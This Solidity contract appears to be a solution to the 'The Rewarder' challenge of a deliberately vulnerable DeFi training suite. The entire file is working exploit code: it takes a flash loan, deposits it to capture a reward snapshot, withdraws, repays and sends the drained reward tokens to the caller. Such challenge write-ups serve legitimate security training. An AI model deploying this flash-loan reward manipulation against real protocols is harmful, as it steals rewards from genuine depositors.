// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {RewardToken} from "../the-rewarder/RewardToken.sol";
import {AccountingToken} from "../the-rewarder/AccountingToken.sol";
import {FlashLoanerPool} from "../the-rewarder/FlashLoanerPool.sol";
import {TheRewarderPool} from "../the-rewarder/TheRewarderPool.sol";

import "hardhat/console.sol";

interface IFlashLoanBorrower {
    function receiveFlashLoan(uint256 amount) external;
}

contract TheRewarderPoolAttack is IFlashLoanBorrower {
    error TheRewarderPoolAttack__NotTheRightTimeToStrike();

    TheRewarderPool private immutable victime;
    FlashLoanerPool private immutable loaner;
    DamnValuableToken public immutable liquidityToken;
    AccountingToken public immutable accountingToken;
    RewardToken public immutable rewardToken;

    constructor(address _victime, address _loaner) {
        victime = TheRewarderPool(_victime);
        loaner = FlashLoanerPool(_loaner);
        liquidityToken = DamnValuableToken(victime.liquidityToken());
        accountingToken = victime.accountingToken();
        rewardToken = victime.rewardToken();
    }

    function receiveFlashLoan(uint256 amount) external {
        // Approve TherewarderPool to transfer our DVT for deposit
        SafeTransferLib.safeApprove(address(liquidityToken), address(victime), amount);
        // @info While depositing triggers snapshot and reward distribution => (1_000_000 * 100) / 1_000_400 = 99.96001599
        victime.deposit(amount);
        // withdraw to be able to repay loan
        victime.withdraw(amount);
        liquidityToken.transfer(address(loaner), amount);
    }

    function launchAttack(uint256 amount) external {
        if (!victime.isNewRewardsRound()) {
            revert TheRewarderPoolAttack__NotTheRightTimeToStrike();
        }

        loaner.flashLoan(amount);

        uint256 rewardAmount = rewardToken.balanceOf(address(this));
        rewardToken.transfer(msg.sender, rewardAmount);
    }
}
